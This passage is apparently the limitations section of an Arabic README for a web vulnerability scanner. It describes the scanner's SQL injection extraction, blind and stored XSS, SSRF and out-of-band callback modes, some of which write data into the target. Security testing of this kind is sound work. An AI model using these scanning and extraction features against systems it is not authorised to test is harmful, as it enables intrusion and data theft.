- `--params` يفحص عنوان الهدف نفسه، مو كل صفحة زحفتها.
- `--second-order` يجرّب بايلود واحد (`sv1'`) وحتى 6 نماذج و6 صفحات؛
  الحقول المفلترة على الإدخال ما راح تنكشف.
- `--blind`: نماذج POST فقط، حتى 6 نماذج وحقلان لكل نموذج وشكلان لكل حقل.
  `--blind-visit` يحتاج Chromium؛ بدونه ينتظر مشرفاً حقيقياً. CSP قوي ممكن
  يمنع الصورة (`/e`) فتطلع النتيجة `MEDIUM` رغم أن السكربت انجلب.
- `--ssrf`: يعتمد على اسم الباراميتر أو قيمة URL كاملة؛ بحد 15 نقطة،
  وبروتوكول HTTP(S) فقط. ما يجرّب `file/gopher` حالياً. allowlist أو مصادقة
  على نقطة الهدف تعني false negative.
- الـ callback لازم يكون قابلاً للوصول من الهدف. الافتراضي `127.0.0.1` للهدف
  المحلي فقط؛ للهدف البعيد استخدم `--oob` عام + نفق/فتح منفذ + `--oob-bind`.
  ما فيه DNS/SMB OOB، ولا OOB SQLi عبر `xp_dirtree`/`UTL_HTTP` بعد.
- multipart يغطي الحقول النصية داخل النموذج، مو محتوى الملفات المرفوعة.
- SQLi: error/boolean/time + UNION extraction. UNION يحتاج عموداً نصياً
  و`ORDER BY`/`UNION` غير محجوبين. `--dump` يقرأ الهوية وأسماء الجداول فقط،
  مو صفوفاً كاملة؛ أوراكل بلا dump حالياً.
- `--headers` و `--cookies` يفحصان عنوان الهدف نفسه، مو كل صفحة زحفتها.
- WAF/flood protection ممكن يقلب النتائج. نزّل `--rps` عند الحاجة.
- الفحص الزمني بطيء بطبيعته: كل بايلود ينتظر عدة ثواني.
- `--stored` و `--second-order` و `--blind` يكتبون بيانات في الهدف.
- الروابط اللي تحتاج تسجيل دخول تبي `--cookie` أو `-H` (المتصفح يستخدم نفس الكوكيز).
- `--scope` يحدد نقاط الفحص والزحف، لكن صفحات SPA قد تحمّل أصولاً خارجية
  أثناء العرض؛ مو جدار شبكة.
- `--retest` يعيد فحص XSS وSQLi error/boolean/time/second-order فقط. Blind،
  SSRF، Stored، DOM، وUNION تحتاج متصفحاً أو استخراجاً كاملاً فتُتخطى.
  الجلسة الأحدث لنفس `-u` هي المرجع.
- `--db` ما فيه تقليم تلقائي؛ احذف الملف أو أرشف الجلسات القديمة يدوياً.
- `--resume` ومحرك async (`httpx`) وcurl repro في HTML لسه P5.1.

---

## الترخيص

MIT — راجع ملف `LICENSE`.

## الإصدار

`1.1.0` — الإصدار العام الحالي (P5.0). تفاصيل التغييرات في `CHANGELOG.md`.
